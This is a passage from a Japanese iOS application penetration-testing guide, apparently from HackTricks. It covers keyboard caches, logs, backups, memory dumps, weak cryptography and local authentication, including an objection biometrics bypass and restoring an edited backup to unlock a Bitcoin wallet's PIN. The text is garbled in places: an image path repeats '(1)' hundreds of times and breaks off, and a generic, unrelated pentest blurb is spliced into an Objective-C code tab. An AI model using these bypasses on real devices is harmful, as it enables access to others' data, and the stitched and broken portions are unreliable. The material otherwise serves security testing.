デフォルトでは、キーボードは`Library/Keyboard/{locale}-dynamic-text.dat`ファイルまたは`/private/var/mobile/Library/Keyboard/dynamic-text.dat`にこのキャッシュを保存しますが、他の場所に保存されている可能性もあります。\
キャッシュをリセットするには、_**設定**_ > _**一般**_ > _**リセット**_ > _**キーボード辞書をリセット**_ に移動します。

{% hint style="info" %}
したがって、これらのファイルを常にチェックし、可能な**機密情報**を検索してください。\
ネットワークトラフィックを傍受することで、カスタムキーボードがキーストロークをリモートサーバーに送信しているかどうかを確認することもできます。
{% endhint %}

キーボードキャッシュには、[UITextInputTraitsプロトコル](https://developer.apple.com/reference/uikit/uitextinputtraits)が使用されます。UITextField、UITextView、およびUISearchBarクラスは、このプロトコルを自動的にサポートし、次のプロパティを提供します。

* `var autocorrectionType: UITextAutocorrectionType`は、入力中にオートコレクションが有効かどうかを決定します。オートコレクションが有効な場合、テキストオブジェクトは未知の単語を追跡し、適切な置換を提案します。ユーザーが置換をオーバーライドしない限り、入力されたテキストを自動的に置換します。このプロパティのデフォルト値は`UITextAutocorrectionTypeDefault`であり、ほとんどの入力方法ではオートコレクションが有効になります。
* `var secureTextEntry: BOOL`は、`UITextField`に対してテキストのコピーとテキストのキャッシュが無効になり、入力されているテキストが非表示になるかどうかを決定します。このプロパティのデフォルト値は`NO`です。

**コードでこの動作を特定するには:**

* 類似の実装を持つソースコードを検索し、以下のようなものを探します。
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Xcodeの`Interface Builder`でxibとstoryboardファイルを開き、適切なオブジェクトの`Attributes Inspector`で`Secure Text Entry`と`Correction`の状態を確認します。

アプリケーションは、テキストフィールドに入力された機密情報のキャッシュを防止する必要があります。キャッシュを無効にするには、`textObject.autocorrectionType = UITextAutocorrectionTypeNo`の指示を使用して、必要なUITextFields、UITextViews、およびUISearchBarsでプログラム的に無効にします。PINやパスワードなどのマスクする必要があるデータに対しては、`textObject.secureTextEntry`を`YES`に設定します。
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **ログ**

コードをデバッグする最も一般的な方法は、ログを使用することであり、アプリケーションはログ内に**機密情報を表示する可能性があります**。\
iOSバージョン6以前では、ログはワールドリーダブルでした（悪意のあるアプリは他のアプリのログを読み取り、そこから機密情報を抽出することができました）。**現在では、アプリは自分自身のログにのみアクセスできます**。

ただし、**アンロックされた**デバイスに**物理的なアクセス**権限を持つ**攻撃者**は、それをコンピュータに接続し、ログを**読み取る**ことができます（アプリがアンインストールされても、アプリによってディスクに書き込まれたログは削除されません）。

アプリの**すべての画面をナビゲート**し、**すべてのUI要素と機能**とやり取りし、すべてのテキストフィールドに入力テキストを提供し、**ログを確認**して**公開された機密情報**を探すことが推奨されます。

以下のキーワードを使用して、アプリのソースコードを事前定義およびカスタムのログステートメントをチェックします：

* 事前定義および組み込み関数：
* NSLog
* NSAssert
* NSCAssert
* fprintf
* カスタム関数：
* Logging
* Logfile

**システムログのモニタリング**

多くのアプリは、情報（および潜在的に機密性の高い）メッセージをコンソールログに記録します。ログにはクラッシュレポートやその他の有用な情報も含まれています。

次のツールを使用できます：
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Xcodeの**デバイス**ウィンドウを通じてコンソールログを収集する方法は次のとおりです：

1. Xcodeを起動します。
2. ホストコンピュータにデバイスを接続します。
3. **ウィンドウ** -> **デバイスとシミュレータ**を選択します。
4. デバイスウィンドウの左側のセクションで接続されたiOSデバイスをクリックします。
5. 問題を再現します。
6. デバイスウィンドウの右上にある**コンソールを開く**ボタンをクリックして、別のウィンドウでコンソールログを表示します。

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.io/)を使用して、世界で最も先進的なコミュニティツールによって強化された**ワークフローを簡単に構築**および**自動化**します。\
今すぐアクセスを取得：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## バックアップ

iOSには、デバイスに保存されているデータのコピーを作成する自動バックアップ機能が含まれています。iTunes（macOS Catalinaまで）またはFinder（macOS Catalina以降）を使用するか、iCloudバックアップ機能を使用して、ホストコンピュータからiOSバックアップを作成できます。いずれの場合も、バックアップにはApple Pay情報やTouch IDの設定などの高度に機密性の高いデータを除く、iOSデバイスに保存されているほぼすべてのデータが含まれます。

iOSはインストールされたアプリとそのデータをバックアップするため、明らかな懸念は、アプリによって保存された**機密ユーザーデータ**がバックアップを通じて**意図せず漏洩する可能性**があるかどうかです。もう1つの懸念は、**データを保護したりアプリの機能を制限するために使用される機密の設定が、変更されたバックアップを復元した後にアプリの動作を変更するために改ざんされる可能性があるかどうか**です。両方の懸念は妥当であり、これらの脆弱性は現在、多数のアプリに存在することが証明されています。

モバイルアプリがインストールされたデバイスのバックアップには、[アプリのプライベートディレクトリ](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW12)内のすべてのサブディレクトリ（`Library/Caches/`を除く）およびファイルが含まれます。したがって、**アプリのプライベートディレクトリまたはサブディレクトリ内のファイルやフォルダに平文で機密データを保存しないようにしてください**。

`Documents/`および`Library/Application Support/`のすべてのファイルは、デフォルトで常にバックアップされますが、[バックアップからファイルを除外](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple\_ref/doc/uid/TP40010672-CH2-SW28)することができます。`NSURLIsExcludedFromBackupKey`キーを使用して`NSURL setResourceValue:forKey:error:`を呼び出すことで、バックアップからファイルとディレクトリを除外できます。\
ファイルシステムのプロパティである[NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple\_ref/c/data/NSURLIsExcludedFromBackupKey)と[CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple\_ref/c/data/kCFURLIsExcludedFromBackupKey)を使用して、ファイルとディレクトリをバックアップから除外できます。

{% hint style="warning" %}
したがって、アプリケーションのバックアップをチェックする際には、**アクセス可能な機密情報**があるかどうかを確認し、バックアップの設定を変更してバックアップを復元することで、アプリケーションの**機密な動作を変更できるかどうか**を確認する必要があります。
{% endhint %}

**テスト方法**

まず、デバイスのバックアップを作成します（Finderを使用して行うことができます）。バックアップの保存場所を見つけるために、公式のAppleのドキュメントを参照してください：[iPhone、iPad、およびiPod touchのバックアップの場所を特定する](https://support.apple.com/en-us/HT204215)。

デバイスのバックアップ（`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`）を見つけたら、grepなどを使用して機密情報を探したり、[iMazing](https://imazing.com)のようなツールを使用したりできます。

バックアップが暗号化されているかどうかを特定するには、バックアップディレクトリのルートにある「Manifest.plist」というファイルから「IsEncrypted」というキーを確認できます。次の例は、バックアップが暗号化されていることを示す設定です：
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
必要に応じて、暗号化されたバックアップで作業する場合、[DinoSecのGitHubリポジトリ](https://github.com/dinosec/iphone-dataprotection/tree/master/python\_scripts)には、**backup\_tool.py**や**backup\_passwd.py**などのPythonスクリプトがいくつかあります。これらは良い出発点となるでしょう。ただし、最新のiTunes/Finderバージョンでは動作しない可能性があり、調整が必要になるかもしれません。

また、ツール[**iOSbackup**](https://pypi.org/project/iOSbackup/)を使用して、パスワードで暗号化されたiOSバックアップから簡単にファイルを読み取り、抽出することもできます。

**動作の変更方法**

オープンソースのビットコインウォレットアプリである[Bither](https://github.com/bither/bither-ios)では、UIをロックするためにPINを設定することができます。\
このPINは、**pin\_code**という**key**で`net.bither.plist`というファイルに保存されています。\
このplist内のキーを削除し、バックアップを復元すると、ウォレットにアクセスできるようになります。

## 機密データのメモリテスト

ある時点で、機密情報がメモリに保存されることになります。目的は、この情報ができるだけ短時間で公開されるようにすることです。

アプリケーションのメモリを調査するためには、まず**メモリダンプ**を作成します。または、デバッガなどを使用してメモリをリアルタイムで**分析**することもできます。どの方法を使用しても、これは非常にエラーが発生しやすいプロセスです。ダンプは実行された関数によって残されたデータを提供し、重要なステップを実行し忘れる可能性があります。また、分析中にデータを見落とすことは非常に簡単です。データの足跡（正確な値または形式）を知っていない限り、メモリにキーが表示されることはほとんどありません。たとえば、アプリがランダムに生成された対称鍵によって暗号化される場合、その鍵の値を他の手段で見つけない限り、メモリに鍵を見つけることは非常に困難です。

**メモリダンプの取得と分析**

脱獄済みのデバイスまたは非脱獄済みのデバイスを使用して、[objection](https://github.com/sensepost/objection)や[Fridump](https://github.com/Nightbringer21/fridump)を使用して、アプリのプロセスメモリをダンプすることができます。

メモリがダンプされた後（たとえば、"memory"という名前のファイルにダンプされた場合）、探しているデータの性質に応じて、さまざまなツールセットが必要になります。たとえば、文字列に焦点を当てている場合、`strings`コマンドや`rabin2 -zz`コマンドを実行してそれらの文字列を抽出することが十分かもしれません。
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
お気に入りのエディタで`strings.txt`を開き、機密情報を特定してください。

ただし、他の種類のデータを調査したい場合は、radare2とその検索機能を使用することをお勧めします。詳細やオプションのリストについては、radare2の検索コマンド（`/?`）のヘルプを参照してください。以下はその一部です。
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**ランタイムメモリ解析**

[r2frida](https://github.com/nowsecure/r2frida)を使用することで、アプリが実行中であり、ダンプする必要なくメモリを分析および検査することができます。例えば、r2fridaから前述の検索コマンドを実行し、文字列や16進数の値などをメモリ内で検索することができます。その際、セッションを`r2 frida://usb//<name_of_your_app>`で開始した後、検索コマンド（および他のr2frida固有のコマンド）の前にバックスラッシュ`\`を付けることを忘れないでください。

## 破損した暗号化

### 鍵管理プロセスの不備

一部の開発者は、機密データをローカルストレージに保存し、コード内でハードコード/予測可能な鍵で暗号化しています。これは行ってはならないことです。リバースエンジニアリングによって攻撃者が機密情報を抽出することができる可能性があるためです。

### 安全でないおよび/または非推奨のアルゴリズムの使用

開発者は、認証のチェック、データの保存、送信に**非推奨のアルゴリズム**を使用すべきではありません。これらのアルゴリズムのいくつかには、RC4、MD4、MD5、SHA1などがあります。例えば、パスワードを保存するためにハッシュが使用される場合、ソルトを使用したハッシュブルートフォース耐性のある方法を使用する必要があります。

### チェック

コード内に**ハードコードされた**パスワード/シークレットがあるか、それらが**予測可能**であるか、コードが**弱い****暗号化**アルゴリズムを使用しているかを確認するために行う主なチェックです。

興味深いことに、**objection**を使用して一部の**暗号**ライブラリを自動的に**モニタリング**することができます。以下のように実行します：
```swift
ios monitor crypt
```
**詳細な情報**については、iOSの暗号化APIとライブラリにアクセスしてください。[https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## ローカル認証

テスターは、ローカル認証は常にリモートエンドポイントで強制されるべきであること、または暗号プリミティブに基づいていることを意識する必要があります。データが認証プロセスから返らない場合、攻撃者は簡単にローカル認証をバイパスすることができます。

[**ローカル認証フレームワーク**](https://developer.apple.com/documentation/localauthentication)は、開発者が認証ダイアログをユーザーに拡張するためのAPIセットを提供します。リモートサービスに接続する文脈では、ローカル認証を実装するために[keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html)を活用することが可能です（および推奨されます）。

**指紋ID**センサーは、[SecureEnclaveセキュリティコプロセッサ](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf)によって操作され、指紋データをシステムの他の部分に公開しません。Touch IDの次に、Appleは顔認識に基づいた認証を可能にする_Face ID_を導入しました。

開発者は、Touch ID/Face ID認証を組み込むために2つのオプションがあります：

* `LocalAuthentication.framework`は、ユーザーをTouch IDを介して認証するために使用できる高レベルのAPIです。アプリは登録された指紋に関連するデータにアクセスできず、認証が成功したかどうかのみを通知されます。
* `Security.framework`は、[キーチェーンサービス](https://developer.apple.com/documentation/security/keychain\_services)にアクセスするための低レベルのAPIです。アプリがバイオメトリック認証でいくつかの秘密データを**保護する必要がある場合**、これは安全なオプションです。アクセス制御はシステムレベルで管理され、簡単にバイパスすることはできません。`Security.framework`にはC APIがありますが、[いくつかのオープンソースのラッパーが利用可能です](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id)。これにより、キーチェーンへのアクセスはNSUserDefaultsへのアクセスと同じくらい簡単になります。

{% hint style="danger" %}
`LocalAuthentication.framework`または`Security.framework`を使用することは、攻撃者によってバイパスされる可能性のある制御であることに注意してください。これらの制御は、真偽値のみを返し、進行するためのデータは返しません。詳細については、[Don't touch me that way, by David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM)を参照してください。
{% endhint %}

### ローカル認証フレームワーク

開発者は、**`LAContext`**クラスの**`evaluatePolicy`**関数を利用して**認証プロンプト**を表示することができます。利用可能な2つのポリシーは、許容される認証形式を定義します：

* `deviceOwnerAuthentication`(Swift)または`LAPolicyDeviceOwnerAuthentication`(Objective-C)：利用可能な場合、ユーザーはTouch ID認証を実行するように求められます。Touch IDがアクティブ化されていない場合、デバイスのパスコードが代わりに要求されます。デバイスのパスコードが有効にされていない場合、ポリシーの評価は失敗します。
* `deviceOwnerAuthenticationWithBiometrics`(Swift)または`LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C)：認証はバイオメトリクスに制限され、ユーザーはTouch IDのために求められます。

**`evaluatePolicy`関数は、ユーザーが正常に認証されたかどうかを示す真偽値**を返します。つまり、簡単にバイパスすることができます（以下を参照）。

### キーチェーンを使用したローカル認証

**iOSキーチェーンAPIは（そして使用すべきです）ローカル認証を実装するために使用**できます。このプロセスでは、アプリはキーチェーンに秘密の認証トークンまたは他の秘密のデータを保存します。リモートサービスに認証するために、ユーザーはパスフレーズまたは指紋を使用してキーチェーンをロック解除し、秘密のデータを取得する必要があります。

キーチェーンは、特別な`SecAccessControl`属性を持つアイテムを保存することができます。これにより、ユーザーがTouch ID認証をパスした後（または属性パラメータで許可されている場合はパスコード）、キーチェーンからアイテムにアクセスできるようになります。

次の例では、文字列「test\_strong\_password」をキーチェーンに保存します。文字列は、パスコードが設定されている場合にのみ現在のデバイスでアクセスでき、現在登録されている指に対してTouch ID認証が行われた後にのみアクセスできます（`kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`パラメータと`SecAccessControlCreateFlags.biometryCurrentSet`パラメータ）：

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Objective-C" %}

以下は、iOSアプリのペネトレーションテストに使用するための情報です。このガイドでは、iOSアプリの脆弱性を特定し、悪用するためのテクニックについて説明します。

## ペネトレーションテストの準備

iOSアプリのペネトレーションテストを実施する前に、以下の手順を実行する必要があります。

1. **iOSデバイスの準備**: ペネトレーションテストを実施するためには、iOSデバイスが必要です。デバイスは、実機またはシミュレータのいずれかを使用できます。

2. **iOSアプリの取得**: ペネトレーションテストを実施するためには、対象のiOSアプリを取得する必要があります。アプリは、App Storeから直接ダウンロードするか、IPAファイルを入手することができます。

3. **iOSアプリの解析**: 取得したiOSアプリを解析し、内部の構造やコードを理解する必要があります。これには、逆コンパイルツールやデコンパイラを使用することができます。

## iOSアプリの脆弱性の特定

iOSアプリの脆弱性を特定するためには、以下のテクニックを使用することができます。

1. **リバースエンジニアリング**: iOSアプリのバイナリを解析し、内部のコードやロジックを理解するためにリバースエンジニアリングを行います。これには、逆コンパイルツールやデバッガを使用することができます。

2. **情報収集**: iOSアプリに関連する情報を収集し、アプリの脆弱性を特定するための情報を収集します。これには、アプリのバージョン、使用されているフレームワークやライブラリ、APIエンドポイントなどの情報が含まれます。

3. **セキュリティテスト**: iOSアプリのセキュリティテストを実施し、脆弱性を特定します。これには、認証のバイパス、データの漏洩、不正なAPI呼び出し、不正なデータ入力などのテストが含まれます。

## iOSアプリの脆弱性の悪用

iOSアプリの脆弱性を悪用するためには、以下のテクニックを使用することができます。

1. **認証のバイパス**: iOSアプリの認証機能をバイパスし、アプリにアクセスするための認証を回避します。これには、デバッグモードの有効化、認証トークンの改ざん、セッションハイジャックなどのテクニックが含まれます。

2. **データの漏洩**: iOSアプリからデータを漏洩させるために、データベースやファイルシステムへのアクセスを悪用します。これには、SQLインジェクション、ファイルインクルージョン、データベースの脆弱性などのテクニックが含まれます。

3. **不正なAPI呼び出し**: iOSアプリのAPI呼び出しを悪用し、アプリの動作を変更したり、不正な操作を行ったりします。これには、APIエンドポイントの改ざん、APIキーの不正使用、APIの脆弱性などのテクニックが含まれます。

以上が、iOSアプリのペネトレーションテストに使用するための情報です。これらのテクニックを使用して、iOSアプリの脆弱性を特定し、悪用することができます。

{% endtab %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}
{% endtabs %}

これで、キーチェーンから保存されたアイテムをリクエストすることができます。キーチェーンサービスは、ユーザーに認証ダイアログを表示し、適切な指紋が提供されたかどうかに応じてデータまたはnilを返します。

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}オブジェクティブ-C{% endtab %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### 検出

アプリのバイナリの共有ダイナミックライブラリのリストを分析することで、アプリ内でのフレームワークの使用も検出することができます。これは `otool` を使用して行うことができます。
```bash
$ otool -L <AppName>.app/<AppName>
```
もしアプリで`LocalAuthentication.framework`が使用されている場合、出力には以下の2つの行が含まれます（`LocalAuthentication.framework`は内部で`Security.framework`を使用していることを覚えておいてください）:
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
もし`Security.framework`が使用されている場合、2番目のものだけが表示されます。

### ローカル認証フレームワークのバイパス

#### Objection

[**Objection Biometrics Bypass**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass)は、LocalAuthenticationをバイパスするために使用されます。ObjectionはFridaを使用して`evaluatePolicy`関数をインストルメントし、認証が成功しなかった場合でも`True`を返すようにします。`ios ui biometrics_bypass`コマンドを使用して、安全でない生体認証をバイパスします。Objectionはジョブを登録し、`evaluatePolicy`の結果を置き換えます。これはSwiftとObjective-Cの両方で動作します。
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
